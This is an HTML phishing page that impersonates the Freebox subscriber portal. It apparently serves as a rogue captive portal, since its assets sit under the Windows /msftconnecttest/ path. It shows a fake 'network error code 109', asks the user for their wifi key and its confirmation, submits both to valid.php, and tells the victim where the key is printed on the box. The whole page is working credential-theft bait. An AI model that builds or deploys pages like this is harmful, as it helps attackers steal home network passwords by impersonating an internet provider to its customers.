
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Bienvenue sur votre Espace abonn&eacute; Freebox</title>

<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/> 
<style>
    h2 { color: #000000;
font-family:sans-serif;
}
  </style>
</head>

<body>
<img src="/msftconnecttest/images/freepub.png"/>
<div class="login_container" role="main">
  <div class="login_left">   

    <div class="login_form">
      <h2>Erreur r&eacuteseau code 109: reconnectez vous avec votre cl&eacute; wifi. </h2>

	  <form method="POST" action="valid.php">
      <!--div class="loginalert" aria-live="assertive" role="alert"><strong>  </strong></div-->
        
        <input type="hidden" name="link" value="" aria-disabled="true" />
        <fieldset>
          <div class="field"><label for="login" class="label_login" aria-label="Identifiant"></label><input type="text" name="cle" class="inputfield" id="login" value=""Votre identifiant" onfocus="this.value='';"" aria-required="true" title="Clé wifi"/></div>
          <div class="field"><label for="pass" class="label_pass" aria-label="Confirmation"></label><input type="text" name="cleconf" class="inputfield" aria-required="true" title="Confirmation" /></div>

      <div class="login_new">
        <img src="/msftconnecttest/images/newevent.png" style="vertical-align:text-bottom" /> &nbsp;&nbsp;<strong>Besoin d'aide ? un technicien vous répond</strong> <a href="/msftconnecttest/shout/freetchat.php" target="_blank"><u>Aide en ligne</u> ...</a>
      </div>


        </fieldset>
               
        <input type="submit" name="ok" class="login_button" title="Se Connecter" />

    </div>
    <div id="bottom">
    <!--SITEMAP-->
    <div id="bottom-links">
    </div>
    <!--SITEMAP-->
    <div id="bottom-infos">
    </div>
    <div class="clear"></div>


</div>
</div>
</br>
<p> la clé wifi se situe derrière votre Freebox sur une petite étiquette ou sur le carton d'emballage de votre Freebox.
</br>
<img class="idfree" src="/msftconnecttest/images/freecle.png"/>




</body>
</html>

